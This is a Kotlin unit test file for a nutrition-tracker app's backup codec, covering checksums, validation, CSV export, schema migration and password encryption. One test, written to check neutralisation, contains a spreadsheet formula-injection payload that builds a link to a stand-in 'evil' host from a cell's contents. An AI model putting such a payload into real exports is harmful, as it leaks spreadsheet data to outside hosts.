package com.nutritiontracker.core

import com.nutritiontracker.core.backup.BackupCodec
import com.nutritiontracker.core.backup.BackupCrypto
import com.nutritiontracker.core.backup.BackupPayload
import com.nutritiontracker.core.backup.BackupReadResult
import com.nutritiontracker.core.backup.DiaryCsvExporter
import com.nutritiontracker.core.backup.FavoriteDto
import com.nutritiontracker.core.backup.FoodDto
import com.nutritiontracker.core.backup.FoodEntryDto
import com.nutritiontracker.core.backup.ProfileDto
import com.nutritiontracker.core.backup.RecipeDto
import com.nutritiontracker.core.backup.RecipeIngredientDto
import com.nutritiontracker.core.backup.WaterDto
import com.nutritiontracker.core.backup.WeightDto
import com.nutritiontracker.core.model.AmountUnit
import com.nutritiontracker.core.model.MealType
import com.nutritiontracker.core.model.Nutrient
import com.nutritiontracker.core.model.Nutrients
import kotlinx.serialization.json.jsonObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertThrows
import org.junit.Assert.assertTrue
import org.junit.Test
import java.time.LocalDate

class BackupTest {
    private val now = 1_795_000_000_000L
    private val day = LocalDate.of(2026, 11, 21).toEpochDay()

    private fun payload() = BackupPayload(
        profile = ProfileDto(
            sex = "female", birthEpochDay = LocalDate.of(1990, 5, 1).toEpochDay(), heightCm = 168.0,
            startWeightKg = 74.0, targetWeightKg = 66.0, activityLevel = "light", deficitMode = "small",
            proteinPercent = 25, fatPercent = 30, carbsPercent = 45, waterGoalMl = 2000,
            adaptiveEnabled = false, createdAt = now, updatedAt = now,
        ),
        foods = listOf(
            FoodDto(
                id = 1, name = "Куриное филе отварное", source = "user", basis = "GRAM",
                nutrients = mapOf("energy" to 165.0, "protein" to 31.0, "fat" to 3.6, "carbs" to 0.0),
                createdAt = now, updatedAt = now,
            ),
            FoodDto(
                id = 2, name = "Куриный суп", source = "recipe", basis = "GRAM", recipeId = 10,
                nutrients = mapOf("energy" to 44.0, "vitamin_c" to 4.6), incompleteNutrients = listOf("vitamin_c"),
                createdAt = now, updatedAt = now,
            ),
        ),
        entries = listOf(
            FoodEntryDto(
                id = 100, foodId = 1, epochDay = day, mealType = "lunch", amount = 200.0, unit = "GRAM",
                foodName = "Куриное филе отварное", source = "user",
                nutrientsPer100 = mapOf("energy" to 165.0, "protein" to 31.0), createdAt = now, updatedAt = now,
            ),
            // Продукт удалён, но запись дневника хранит снимок.
            FoodEntryDto(
                id = 101, foodId = null, epochDay = day, mealType = "snack", amount = 1.5, unit = "GRAM",
                foodName = "Удалённый продукт", source = "off", nutrientsPer100 = mapOf("energy" to 400.0),
                createdAt = now, updatedAt = now,
            ),
        ),
        recipes = listOf(RecipeDto(id = 10, name = "Куриный суп", cookedWeightG = 1400.0, foodId = 2, createdAt = now, updatedAt = now)),
        recipeIngredients = listOf(
            RecipeIngredientDto(id = 1, recipeId = 10, foodId = 1, name = "Куриное филе", amount = 200.0, unit = "GRAM", nutrientsPer100 = mapOf("energy" to 165.0), position = 0),
        ),
        weights = listOf(WeightDto(id = 1, epochDay = day, weightKg = 73.4, waistCm = 80.0, createdAt = now, updatedAt = now)),
        water = listOf(WaterDto(id = 1, epochDay = day, amountMl = 250, createdAt = now)),
        favorites = listOf(FavoriteDto(id = 1, foodId = 1, createdAt = now)),
    )

    @Test
    fun `копия записывается и читается без потерь`() {
        val text = BackupCodec.encode(payload(), "1.0.0", now)
        val r = BackupCodec.read(text)
        assertTrue(r.toString(), r is BackupReadResult.Valid)
        r as BackupReadResult.Valid
        assertEquals(payload(), r.file.payload)
        assertEquals(2, r.summary.entries)
        assertEquals(day, r.summary.firstEpochDay)
    }

    @Test
    fun `изменённый файл не проходит проверку контрольной суммы`() {
        val text = BackupCodec.encode(payload(), "1.0.0", now).replace("\"amount\": 200.0", "\"amount\": 2000.0")
        val r = BackupCodec.read(text)
        assertTrue(r is BackupReadResult.Invalid)
        assertTrue((r as BackupReadResult.Invalid).errors.single().contains("Контрольная сумма"))
    }

    @Test
    fun `посторонний и повреждённый файл отклоняются`() {
        assertTrue(BackupCodec.read("") is BackupReadResult.Invalid)
        assertTrue(BackupCodec.read("{\"hello\": 1}") is BackupReadResult.Invalid)
        assertTrue(BackupCodec.read("не json") is BackupReadResult.Invalid)
        val text = BackupCodec.encode(payload(), "1.0.0", now)
        assertTrue(BackupCodec.read(text.dropLast(40)) is BackupReadResult.Invalid)
        val future = text.replace("\"schemaVersion\": 2", "\"schemaVersion\": 99")
        val r = BackupCodec.read(future) as BackupReadResult.Invalid
        assertTrue(r.errors.single().contains("более новой версией"))
    }

    @Test
    fun `битые ссылки и недопустимые значения находятся`() {
        val bad = payload().copy(
            entries = payload().entries + FoodEntryDto(
                id = 102, foodId = 999, epochDay = day, mealType = "brunch", amount = -5.0, unit = "CUP",
                foodName = "x", source = "user", nutrientsPer100 = mapOf("energy" to -1.0, "mystery" to 1.0),
                createdAt = now, updatedAt = now,
            ),
            favorites = listOf(FavoriteDto(id = 1, foodId = 555, createdAt = now)),
        )
        val errors = BackupCodec.validate(bad)
        assertTrue(errors.any { it.contains("несуществующий продукт #999") })
        assertTrue(errors.any { it.contains("неизвестный приём пищи") })
        assertTrue(errors.any { it.contains("недопустимое количество") })
        assertTrue(errors.any { it.contains("неизвестная единица") })
        assertTrue(errors.any { it.contains("недопустимое значение energy") })
        assertTrue(errors.any { it.contains("неизвестный нутриент «mystery»") })
        assertTrue(errors.any { it.contains("Избранное") })
        // Файл с ошибками целиком отклоняется.
        assertTrue(BackupCodec.read(BackupCodec.encode(bad, "1.0.0", now)) is BackupReadResult.Invalid)
    }

    @Test
    fun `CSV дневника — неизвестное пустая ячейка, ноль это ноль`() {
        val rows = listOf(
            DiaryCsvExporter.Row(
                LocalDate.of(2026, 11, 21), MealType.LUNCH, "Суп; домашний", null, 250.0, AmountUnit.GRAM,
                Nutrients.of(mapOf(Nutrient.ENERGY to 44.0, Nutrient.CARBS to 0.0, Nutrient.VITAMIN_C to 4.6), setOf(Nutrient.VITAMIN_C)),
            ),
        )
        val csv = DiaryCsvExporter.export(rows)
        assertTrue(csv.startsWith(DiaryCsvExporter.BOM))
        val lines = csv.removePrefix(DiaryCsvExporter.BOM).trimEnd().split("\r\n")
        assertEquals(2, lines.size)
        val header = lines[0].split(";")
        val cells = lines[1].split(";").let { it } // поле с «;» в кавычках
        assertTrue(lines[1].startsWith("2026-11-21;Обед;\"Суп; домашний\";;250;г;110;"))
        val energyIdx = header.indexOf("Энергетическая ценность, ккал")
        val carbsIdx = header.indexOf("Углеводы, г")
        val ironIdx = header.indexOf("Железо, мг")
        val shift = 1 // из-за «;» внутри названия при простом split
        assertEquals("110", cells[energyIdx + shift])
        assertEquals("0", cells[carbsIdx + shift])
        assertEquals("", cells[ironIdx + shift])
        assertTrue(lines[1].endsWith("Витамин C"))
        assertEquals("11,5", cells[header.indexOf("Витамин C, мг") + shift])
    }

    @Test
    fun `CSV нейтрализует формулы в названиях`() {
        val rows = listOf(
            DiaryCsvExporter.Row(
                LocalDate.of(2026, 11, 21), MealType.LUNCH, "=HYPERLINK(\"http://evil/\"&A1;\"нажми\")", "@бренд", 100.0, AmountUnit.GRAM,
                Nutrients.of(Nutrient.ENERGY to 10.0),
            ),
        )
        val line = DiaryCsvExporter.export(rows).removePrefix(DiaryCsvExporter.BOM).split("\r\n")[1]
        assertTrue(line, line.contains("\"'=HYPERLINK("))
        assertTrue(line.contains(";'@бренд;"))
        assertEquals("обычное", DiaryCsvExporter.neutralizeFormula("обычное"))
        assertEquals("'-5", DiaryCsvExporter.neutralizeFormula("-5"))
    }

    @Test
    fun `копия версии 1 без новых полей читается и проверяется`() {
        val v2 = BackupCodec.encode(payload(), "1.0.0", now)
        val root = kotlinx.serialization.json.Json.parseToJsonElement(v2).jsonObject
        val payloadEl = root.getValue("payload").jsonObject
        val profile = payloadEl.getValue("profile").jsonObject
        val oldProfile = kotlinx.serialization.json.JsonObject(profile - "proteinGPerKg")
        val oldPayload = kotlinx.serialization.json.JsonObject(payloadEl + ("profile" to oldProfile))
        val compact = kotlinx.serialization.json.Json.encodeToString(kotlinx.serialization.json.JsonElement.serializer(), oldPayload)
        val sha = java.security.MessageDigest.getInstance("SHA-256").digest(compact.toByteArray()).joinToString("") { "%02x".format(it) }
        val oldFile = kotlinx.serialization.json.JsonObject(
            root + mapOf(
                "schemaVersion" to kotlinx.serialization.json.JsonPrimitive(1),
                "payloadSha256" to kotlinx.serialization.json.JsonPrimitive(sha),
                "payload" to oldPayload,
            ),
        )
        val r = BackupCodec.read(oldFile.toString())
        assertTrue(r.toString(), r is BackupReadResult.Valid)
        assertEquals(1.6, (r as BackupReadResult.Valid).file.payload.profile!!.proteinGPerKg, 1e-9)
    }

    @Test
    fun `некорректный профиль в копии отклоняется до импорта`() {
        val p = payload()
        val bad = p.copy(
            profile = p.profile!!.copy(
                birthEpochDay = LocalDate.of(2199, 1, 1).toEpochDay(), deficitMode = "custom_deficit", customDeficitKcal = -300.0,
                fatPercent = 5, proteinGPerKg = 9.0,
            ),
            weights = p.weights + WeightDto(id = 2, epochDay = day - 1, createdAt = now, updatedAt = now),
        )
        val errors = BackupCodec.validate(bad)
        assertTrue(errors.any { it.contains("дата рождения") })
        assertTrue(errors.any { it.contains("дефицит") })
        assertTrue(errors.any { it.contains("жиров") })
        assertTrue(errors.any { it.contains("г/кг") })
        assertTrue(errors.any { it.contains("пустая запись") })
    }

    @Test
    fun `глубоко вложенный JSON не роняет приложение`() {
        val deep = "[".repeat(200_000) + "]".repeat(200_000)
        assertTrue(BackupCodec.read(deep) is BackupReadResult.Invalid)
    }

    @Test
    fun `шифрование копии паролем`() {
        val text = BackupCodec.encode(payload(), "1.0.0", now)
        val enc = BackupCrypto.encrypt(text, "очень-секретно".toCharArray(), iterations = 100_000)
        assertTrue(BackupCrypto.isEncrypted(enc))
        assertFalse(BackupCrypto.isEncrypted(text))
        assertFalse(enc.contains("Куриное"))
        assertTrue(BackupCodec.read(enc) is BackupReadResult.Invalid)
        val ok = BackupCrypto.decrypt(enc, "очень-секретно".toCharArray()) as BackupCrypto.DecryptResult.Ok
        assertEquals(text, ok.text)
        assertEquals(BackupCrypto.DecryptResult.WrongPassword, BackupCrypto.decrypt(enc, "не-тот-пароль".toCharArray()))
        // Подмена числа итераций в заголовке обнаруживается.
        val tampered = enc.replace("\"iterations\": 100000", "\"iterations\": 100001")
        assertTrue(BackupCrypto.decrypt(tampered, "очень-секретно".toCharArray()) !is BackupCrypto.DecryptResult.Ok)
        assertThrows(IllegalArgumentException::class.java) { BackupCrypto.encrypt(text, "123".toCharArray()) }
    }
}
